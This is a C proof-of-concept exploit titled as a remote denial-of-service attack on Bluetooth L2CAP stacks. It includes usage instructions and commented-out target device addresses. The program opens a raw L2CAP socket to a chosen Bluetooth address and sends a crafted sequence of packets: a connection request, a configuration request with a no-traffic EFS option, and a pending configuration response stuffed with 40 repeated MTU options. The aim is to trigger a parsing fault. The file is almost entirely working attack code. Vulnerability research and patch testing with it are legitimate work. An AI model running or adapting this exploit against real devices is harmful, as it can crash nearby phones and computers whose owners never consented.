//copyright @
//huahuaisadog@gmail.com

/***
***Only for linux devices***
usage:
$ gcc -o test poc_remote_dos.c -lbluetooth
$ sudo ./test TARGET_ADDR
***/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>          
#include <sys/socket.h>
#include <arpa/inet.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>

#define __u8 unsigned char
#define __le16 unsigned short
#define __le32 unsigned int

struct l2cap_cmd_hdr {
	__u8       code;
	__u8       ident;
	__le16     len;
};
struct l2cap_conn_req {
	__le16     psm;
	__le16     scid;
};

struct l2cap_conf_req {
	__le16     dcid;
	__le16     flags;
	__u8       data[0];
};

struct l2cap_conf_rsp {
	__le16     scid;
	__le16     flags;
	__le16     result;
};

struct l2cap_conf_opt {
	__u8 type;
	__u8 len;
};

struct fack_opt{
	__u8 type;
	__u8 len;
	__le16 val;
};

struct l2cap_conf_efs {
	__u8 id;
	__u8 stype;
	__le16 msdu;
	__le32 sdu_itime;
	__le32 acc_lat;
	__le32 flush_to;
};

#define HEAD_LEN (sizeof(struct l2cap_cmd_hdr))
static int parse_conn_req(void *buffer, __u8 ident, __le16 len, void *data) {
	struct l2cap_cmd_hdr head;
	head.code = L2CAP_CONN_REQ;
	head.ident = ident;
	head.len = len;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), data, len);
}

#define L2CAP_SERV_NOTRAFIC 0x00
static int parse_conn_req_efs_notrafic(void *buffer){
	struct l2cap_conf_opt opt;
	struct l2cap_conf_efs efs;
	memset(&efs, 0, sizeof(efs));
	opt.type = L2CAP_CONF_EFS;
	opt.len = sizeof(efs);
	efs.stype = L2CAP_SERV_NOTRAFIC;
	//efs.id = 0x;

	memcpy(buffer, &opt, sizeof(opt));
	memcpy(buffer+sizeof(opt), &efs, sizeof(efs));
	return sizeof(opt)+sizeof(efs);

}
static int parse_conf_req(void *buffer, __u8 ident, __le16 len, void *data){
	struct l2cap_cmd_hdr head;
	struct l2cap_conf_req req;
	head.code = L2CAP_CONF_REQ;
	head.ident = ident;
	head.len = len + sizeof(req);
	req.dcid = 0x40;
	req.flags = 0;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), &req, sizeof(req));
	memcpy(buffer + sizeof(head) + sizeof(req), data, len);
	return len + sizeof(req) + sizeof(head);
}

static int parse_conf_rsp_result_pending(void *buffer, __u8 ident, __le16 len, void *data){
	struct l2cap_conf_rsp rsp;
	struct l2cap_cmd_hdr head;
	head.code = L2CAP_CONF_RSP;
	head.ident = ident;
	head.len = len + sizeof(rsp);
	rsp.scid = 0x40;
	rsp.flags = 0;
	rsp.result  = L2CAP_CONF_PENDING;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), &rsp, sizeof(rsp));
	memcpy(buffer + sizeof(head) + sizeof(rsp), data, len);
	return len + sizeof(rsp) + sizeof(head);
}

int main(int argc ,char* argv[]){
	int sock_fd, ret;
	int i;
	void *buf, *data;
	char dest[18];
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;
	struct fack_opt fack;
	__le16 psm_default = 0x1001;
	int retry_count = 0;

	if(argc != 2){
		printf("usage : sudo ./test TARGET_ADDR\n");
		return -1;
	}

	strncpy(dest, argv[1], 18);
	//char dest[18] = "48:db:50:02:c6:71";  //aosp angler
	//char dest[18] = "dc:a9:04:86:45:cc";   // mars macbookpro
	//char dest[18] = "00:1A:7D:DA:71:14"; //linux mars
	// = "00:1a:7d:da:71:13"; //linux panyu

	sock_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
	if(sock_fd == -1){
		perror("[-]socket create failed : ");
		return -1;
	}

	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
	local_l2_addr.l2_family = PF_BLUETOOTH;
	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));


	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
	if(ret == -1){
		perror("[-]bind()");
		goto out;
	}

	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
	remote_l2_addr.l2_family = PF_BLUETOOTH;
	remote_l2_addr.l2_psm = htobs(psm_default);
	str2ba(dest, &remote_l2_addr.l2_bdaddr);

	while(retry_count < 5){
		if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
			perror("[-]Can't connect"); 
			retry_count ++; 
			remote_l2_addr.l2_psm = htobs(psm_default + retry_count);
			continue;
		}
		else
			break;
	}
	if(retry_count == 5)
		goto out;

	//send conn req
	sleep(2);
	buf = malloc(0x100);
	struct l2cap_conn_req conn_req;
	conn_req.psm = 0x1;
	conn_req.scid = 0x40;
	parse_conn_req(buf, 0x2, sizeof(conn_req), &conn_req);
	ret = send(sock_fd, buf, HEAD_LEN + 0x4, 0);

	//send req data
	sleep(2);
	data = malloc(0x100);
	int data_len = parse_conn_req_efs_notrafic(data);
	int total_len = parse_conf_req(buf, 0x2, data_len, data);
	ret = send(sock_fd, buf, total_len, 0);
	sleep(1);

	//send rsp data
	memset(data, 0, 0x80);
	fack.type = L2CAP_CONF_MTU;
	fack.len = 2;
	fack.val = 0x41;
	for(i = 0; i < 40; i++){
		memcpy(data + i*sizeof(fack), &fack, sizeof(fack));
	}
	total_len = parse_conf_rsp_result_pending(buf, 0x2, 40*sizeof(fack), data);
	ret = send(sock_fd, buf, total_len, 0);
	sleep(3);
	free(data);
	free(buf);
out:
	close(sock_fd);
	return 0; 
}
